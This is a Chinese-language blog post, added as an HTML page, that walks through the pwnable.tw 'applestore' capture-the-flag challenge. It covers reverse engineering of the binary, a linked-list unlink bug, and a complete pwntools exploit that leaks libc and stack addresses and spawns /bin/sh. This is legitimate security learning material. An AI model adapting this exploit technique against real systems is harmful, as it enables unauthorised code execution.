@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="0x01逆向分析
+32位动态链接elf，没有去除符号表
+12  └─[0] &amp;lt;&amp;gt; file applestore   applestore: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically lin">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="greyd0g">
+    
+
+    <!-- Title -->
+    
+    <title>pwnable-applestore | welcome to my heart!</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//cdn.bootcss.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Custom Fonts -->
+    <link href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+    <link href='//fonts.googleapis.com/css?family=Noto+Serif:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+</head>
+
+<body>
+
+    <!-- Content -->
+    <section class="article-container">
+<!-- Back Home -->
+<a class="nav-back" href="/">
+    <i class="fa fa-puzzle-piece"></i>
+</a>
+
+<!-- Page Header -->
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>pwnable-applestore</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="post-content col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <h2 id="0x01逆向分析"><a href="#0x01逆向分析" class="headerlink" title="0x01逆向分析"></a>0x01逆向分析</h2><ul>
+<li><p>32位动态链接elf，没有去除符号表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">  └─[0] &lt;&gt; file applestore   </div><div class="line">applestore: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=35f3890fc458c22154fbc1d65e9108a6c8738111, not stripped</div></pre></td></tr></table></figure>
+</li>
+<li><p>开有nx ，canary 保护</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">  └─[0] &lt;&gt; checksec applestore</div><div class="line">[*] &apos;/mnt/D/project/ctf/pwnabl_tw/lab7/applestore&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure>
+</li>
+<li><p>程序实现了一个常规选单</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">  └─[0] &lt;&gt; ./applestore   </div><div class="line">=== Menu ===</div><div class="line">1: Apple Store</div><div class="line">2: Add into your shopping cart</div><div class="line">3: Remove from your shopping cart</div><div class="line">4: List your shopping cart</div><div class="line">5: Checkout</div><div class="line">6: Exit</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</li>
+<li><p>打开ida加载分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">  unsigned int handler()</div><div class="line">&#123;</div><div class="line">  __int16 v1; // [esp-26h] [ebp-26h]</div><div class="line">  unsigned int v2; // [esp-10h] [ebp-10h]</div><div class="line"></div><div class="line">  v2 = __readgsdword(0x14u);</div><div class="line">  while ( 1 )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;&gt; &quot;);</div><div class="line">    fflush(stdout);</div><div class="line">    my_read(&amp;v1, 0x15u);</div><div class="line">    switch ( atoi(&amp;v1) )</div><div class="line">    &#123;</div><div class="line">      case 1:</div><div class="line">        list();</div><div class="line">        break;</div><div class="line">      case 2:</div><div class="line">        add();</div><div class="line">        break;</div><div class="line">      case 3:</div><div class="line">        delete();</div><div class="line">        break;</div><div class="line">      case 4:</div><div class="line">        cart();‵‵</div><div class="line">        break;</div><div class="line">      case 5:</div><div class="line">        checkout();</div><div class="line">        break;</div><div class="line">      case 6:</div><div class="line">        puts(&quot;Thank You for Your Purchase!&quot;);</div><div class="line">        return __readgsdword(0x14u) ^ v2;</div><div class="line">      default:</div><div class="line">        puts(&quot;It&apos;s not a choice! Idiot.&quot;);</div><div class="line">        break;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>重点关注add函数和delte函数，在add函数中可以发现，购买的物品会存放在一个双链表中，链表的头节点位于bss段。<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">struct good//商品结构体</div><div class="line">&#123;</div><div class="line">  char ＊name;//在cart时打印</div><div class="line">  int value;//在cart时打印</div><div class="line">  struct good * next;//cart时通过next指针遍历</div><div class="line">  struct good * prev;    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>  在删除函数中，使用的是类似与dlmalloc的删除算法。只是删除了链表中的节点，并没有将内存free。<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">FD-&gt;next = BK;</div><div class="line">BK-&gt;prev = FD;</div></pre></td></tr></table></figure></p>
+<p>在checkout函数中，存在一处将栈指针接入链表的条件判断函数。<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">  unsigned int checkout()</div><div class="line">&#123;</div><div class="line">  int v1; // [esp-2Ch] [ebp-2Ch]</div><div class="line">  int v2; // [esp-24h] [ebp-24h]//v2将被连入链表中，而在其他函数中，ebp-0x26中的值均位可控</div><div class="line">  signed int v3; // [esp-20h] [ebp-20h]</div><div class="line">  unsigned int v4; // [esp-10h] [ebp-10h]</div><div class="line"></div><div class="line">  v4 = __readgsdword(0x14u);</div><div class="line">  v1 = cart();</div><div class="line">  if ( v1 == 7174 )</div><div class="line">  &#123;</div><div class="line">    puts(&quot;*: iPhone 8 - $1&quot;);</div><div class="line">    asprintf(&amp;v2, &quot;%s&quot;, &quot;iPhone 8&quot;);</div><div class="line">    v3 = 1;</div><div class="line">    insert(&amp;v2);</div><div class="line">    v1 = 7175;</div><div class="line">  &#125;</div><div class="line">  printf(&quot;Total: $%d\n&quot;, v1);</div><div class="line">  puts(&quot;Want to checkout? Maybe next time!&quot;);</div><div class="line">  return __readgsdword(0x14u) ^ v4;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>  在cart函数中。ebp-0x26出为可控输入，输入长度位0x15.<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">  int cart()</div><div class="line">&#123;</div><div class="line">  signed int v0; // eax</div><div class="line">  signed int v2; // [esp-34h] [ebp-34h]</div><div class="line">  int v3; // [esp-30h] [ebp-30h]</div><div class="line">  _DWORD *i; // [esp-2Ch] [ebp-2Ch]</div><div class="line">  __int16 v5; // [esp-26h] [ebp-26h]//v5为我们的输入值</div><div class="line">  unsigned int v6; // [esp-10h] [ebp-10h]</div><div class="line"></div><div class="line">  v6 = __readgsdword(0x14u);</div><div class="line">  v2 = 1;</div><div class="line">  v3 = 0;</div><div class="line">  printf(&quot;Let me check your cart. ok? (y/n) &gt; &quot;);</div><div class="line">  fflush(stdout);</div><div class="line">  my_read(&amp;v5, 0x15u);</div><div class="line">  if ( v5 == &apos;y&apos; )</div><div class="line">  &#123;</div><div class="line">    puts(&quot;==== Cart ====&quot;);</div><div class="line">    for ( i = dword_804B070; i; i = i[2] )</div><div class="line">    &#123;</div><div class="line">      v0 = v2++;</div><div class="line">      printf(&quot;%d: %s - $%d\n&quot;, v0, *i, i[1]);</div><div class="line">      v3 += i[1];</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return v3;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>  在my_read函数中,ebp-0x10中为我们的输入值，输入长度位0x15.<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">  char *__cdecl my_read(char *a1, size_t a2)</div><div class="line">&#123;</div><div class="line">  char *result; // eax</div><div class="line">  ssize_t v3; // [esp-10h] [ebp-10h]</div><div class="line"></div><div class="line">  v3 = read(0, a1, a2);</div><div class="line">  if ( v3 == -1 )</div><div class="line">    return puts(&quot;Input Error.&quot;);</div><div class="line">  result = &amp;a1[v3];</div><div class="line">  a1[v3] = 0;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="0x02-利用思路"><a href="#0x02-利用思路" class="headerlink" title="0x02 利用思路"></a>0x02 利用思路</h2><ul>
+<li>通过组合购买物品价格达到7174将栈指针链入商品链表中。</li>
+<li>控制链入的节点的name字段的值leak libc地址和栈地址(通过__environ)。</li>
+<li>控制next和prev指针，改写保存的上层函数ebp。</li>
+<li>通过my_read 函数改写自身返回地址。</li>
+</ul>
+<p>最终exp</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></td><td class="code"><pre><div class="line">  #!/usr/bin/env python</div><div class="line"># coding=utf-8</div><div class="line">from pwn import *</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line">local = 1</div><div class="line">libc = ELF(&quot;./libc_32.so.6&quot;)</div><div class="line">if local:</div><div class="line">    p = process(&apos;./applestore&apos;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc_32.so.6&quot;&#125;)</div><div class="line">else :</div><div class="line">    p = remote(&apos;chall.pwnable.tw&apos;,10104)#nc chall.pwnable.tw 10104</div><div class="line"></div><div class="line">def add(idx):</div><div class="line">    p.recvuntil(&quot;&gt; &quot;)</div><div class="line">    p.sendline(&apos;2&apos;)</div><div class="line">    p.recvuntil(&quot;Device Number&gt; &quot;)</div><div class="line">    p.sendline(str(idx))</div><div class="line"></div><div class="line">def dele(idx):   </div><div class="line">    p.recvuntil(&quot;&gt;&quot;)</div><div class="line">    p.sendline(&apos;3&apos;)</div><div class="line">    p.recvuntil(&quot;Item Number&gt; &quot;)</div><div class="line">    p.sendline(str(idx))</div><div class="line"></div><div class="line">def pwn():</div><div class="line">  #  raw_input(&quot;starting ....\n&quot;)</div><div class="line">    for x in xrange(8):</div><div class="line">        add(1)</div><div class="line">    for x in xrange(17):</div><div class="line">        add(2)</div><div class="line">    for x in xrange(1):</div><div class="line">        add(3)</div><div class="line">    p.recvuntil(&apos;&gt; &apos;)</div><div class="line">    p.sendline(p32(0x0804B035))</div><div class="line">    p.recvuntil(&quot;Let me check your cart. ok? &quot;)</div><div class="line">    p.sendline(&apos;y&apos;)</div><div class="line">    &apos;&apos;&apos;</div><div class="line">0xffc5bc38:	0xf7609940	0xf7609940	0xffc5bc38	0xffc5bc50</div><div class="line"></div><div class="line">gdb-peda$ x /4wx 0xffc50e38</div><div class="line">0xffc50e38:	0x09d218b8	0x00000001	0xffc50e76	0x00000000</div><div class="line">gdb-peda$ x /4wx 0xffc50e76</div><div class="line">0xffc50e76:	0x0804b035	0x86f7000a	0x8e230804	0x00060804</div><div class="line">gdb-peda$ x /4wx 0xfff90a88</div><div class="line">0xfff90a88:	0x08e038b8	0x00000001	0xfff90ac6	0x00000000</div><div class="line">gdb-peda$ x /4wx 0xfff90ac6</div><div class="line">0xfff90ac6:	0x0804b035	0x86f7000a	0x8e230804	0x00060804</div><div class="line">    &apos;&apos;&apos;</div><div class="line">    p.clean()</div><div class="line">    p.sendline(p32(0x0804B034)+p32(0)*3)   </div><div class="line">    p.recvuntil(&quot;Let me check your cart. ok? &quot;)</div><div class="line">    p.sendline(&apos;y&apos;)</div><div class="line">    p.recvuntil(&quot;28: &quot;)</div><div class="line">    libc_start = u32(p.recvn(4))</div><div class="line">    libc.address = libc_start - libc.symbols[&apos;__libc_start_main&apos;]</div><div class="line">    system = libc.symbols[&apos;system&apos;]</div><div class="line">    bin_sh = libc.search(&apos;/bin/sh&apos;).next()</div><div class="line">    environ = libc.symbols[&apos;__environ&apos;]</div><div class="line">    log.info(&quot;libc address is &quot;+hex(libc.address))</div><div class="line">    log.info(&quot;libc environ &quot;+hex(libc.symbols[&apos;__environ&apos;]))</div><div class="line">    payload = p32(environ)+p32(0)+p32(0)+p32(0)</div><div class="line">    p.sendline(&apos;4&apos;)</div><div class="line">    p.recvuntil(&quot;Let me check your cart. ok? &quot;)</div><div class="line">    p.sendline(&apos;y&apos;+&apos;\x00&apos;+payload)</div><div class="line">    p.recvuntil(&quot;27: &quot;)</div><div class="line">    stack = u32(p.recvn(4))</div><div class="line">    log.info(stack)</div><div class="line">    BK = stack-0xe4</div><div class="line">    ebp2 = stack - 0x104</div><div class="line">    log.info(&quot;stack ptr &quot;+hex(stack))</div><div class="line">    FD = ebp2-8</div><div class="line">    log.info(&quot;system is &quot;+hex(system))</div><div class="line">    payload = &apos;27&apos;+p32(system)+p32(system)+p32(BK)+p32(FD)</div><div class="line">    print pidof(p)</div><div class="line">    raw_input(&apos;attach...&apos;)</div><div class="line">    dele(payload)</div><div class="line">    p.recvuntil(&quot;&gt;&quot;)</div><div class="line">    payload = &apos;\x00&apos;+&apos;\x00&apos;+p32(0xdeadbeef)+p32(system)+p32(0x0804b000)+p32(bin_sh)</div><div class="line">    p.sendline(payload)</div><div class="line">    p.interactive()</div><div class="line">&apos;&apos;&apos;</div><div class="line">0xffd7ba74</div><div class="line">EBP: 0xffd60768 --&gt; 0xffd60788 --&gt; 0x0</div><div class="line">EBP: 0xffd5a9c8 --&gt; 0xffd5aa08 --&gt; 0xffd5aa28 --&gt; 0x0</div><div class="line">0x3a819	execve(&quot;/bin/sh&quot;, esp+0x34, environ)</div><div class="line">constraints:</div><div class="line">  esi is the GOT address of libc</div><div class="line">  [esp+0x34] == NULL</div><div class="line"></div><div class="line">0x5f065	execl(&quot;/bin/sh&quot;, eax)</div><div class="line">constraints:</div><div class="line">  esi is the GOT address of libc</div><div class="line">  eax == NULL</div><div class="line"></div><div class="line">0x5f066	execl(&quot;/bin/sh&quot;, [esp])</div><div class="line">constraints:</div><div class="line">  esi is the GOT address of libc</div><div class="line">  [esp] == NULL</div><div class="line">&apos;&apos;&apos;    </div><div class="line"></div><div class="line">pwn()</div></pre></td></tr></table></figure>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><ul>
+<li>最初想要改写handler函数保存的ebp从而改写eip。</li>
+<li>最终的利用思路是调试时瞎试出来的，思路不清晰。</li>
+<li>看别人wp发现有利用my_read改写atoi的got表的。</li>
+</ul>
+
+ 
+                <!-- Meta -->
+                <div class="post-meta">
+                    <hr>
+                    <br>
+                    <div class="post-tags">
+                        
+                            
+
+<a href="/tags/pwnable/">#pwnable</a>
+
+
+                        
+                    </div>
+                    <div class="post-date">
+                        2017 年 10 月 16 日
+                    </div>
+                </div>
+            </div>
+
+            <!-- Comments -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <!-- Disqus Comments -->
+
+
+            </div>
+        </div>
+    </div>
+</article>
+</section>
+
+    <!-- Scripts -->
+    <!-- jQuery -->
+<script src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script>
+<!-- Bootstrap -->
+<script src="//cdn.bootcss.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<script type="text/javascript">
+	console.log('Hexo-theme-hollow designed by zchen9 🙋 © 2015-' + (new Date()).getFullYear());
+</script>
+
+    <!-- Google Analytics -->
+    
+
+</body>
+
+</html>
